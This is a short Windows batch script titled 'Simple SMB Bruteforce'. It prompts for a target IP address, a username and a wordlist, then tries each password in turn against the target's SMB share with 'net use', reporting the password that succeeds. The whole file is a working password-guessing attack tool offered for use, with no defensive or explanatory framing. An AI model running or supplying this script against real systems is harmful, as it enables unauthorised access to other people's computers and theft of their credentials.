@echo off
title Simple SMB Bruteforce - mpck4
color D
echo.
set /p ip="enter ip address: "
set /p user="enter username: "
set /p wordlist="enter wordlist path: "

set /a count=1
for /f %%a in (%wordlist%) do (
	set pass=%%a
	call :attempt
)
echo connection unsuccessful...
pause
exit

:success
echo.
echo connection successful: %pass%
net use \\%ip% /d /y >nul 2>&1
pause
exit

:attempt
net use \\%ip% /user:%user% %pass% >nul 2>&1
echo [%count%] [%pass%]
set /a count=%count%+1
if %errorlevel% EQU 0 goto success
